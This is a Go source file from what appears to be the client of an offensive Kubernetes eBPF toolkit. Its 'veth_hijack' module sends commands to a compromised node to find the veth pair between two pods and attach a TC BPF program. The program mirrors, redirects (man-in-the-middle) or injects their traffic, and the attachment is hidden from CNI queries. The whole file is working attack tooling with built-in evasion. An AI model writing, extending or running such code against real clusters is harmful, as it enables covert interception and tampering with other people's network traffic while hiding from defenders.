package veth_hijack

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type HijackResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool               `json:"success"`
}

func Execute(target, sourcePod, destPod, mode, output string) error {
	result := &HijackResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"identify_veth_pair",
			"locate veth pair interfaces for source and destination pods",
			"veth_identify_pair",
		},
		{
			"attach_tc_program",
			"attach TC BPF program to veth pair for traffic interception",
			"veth_attach_tc",
		},
		{
			"configure_mode",
			"set hijack mode: mirror (copy traffic), redirect (MITM), or inject (add packets)",
			"veth_set_mode",
		},
		{
			"enable_hijack",
			"activate veth traffic manipulation between pod network namespaces",
			"veth_enable",
		},
		{
			"hide_from_cni",
			"mask TC program attachment from CNI plugin interface queries",
			"veth_hide_cni",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + sourcePod + "#" + destPod + "#" + mode
		status := shared.SendCommand(target, "/veth_hijack", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
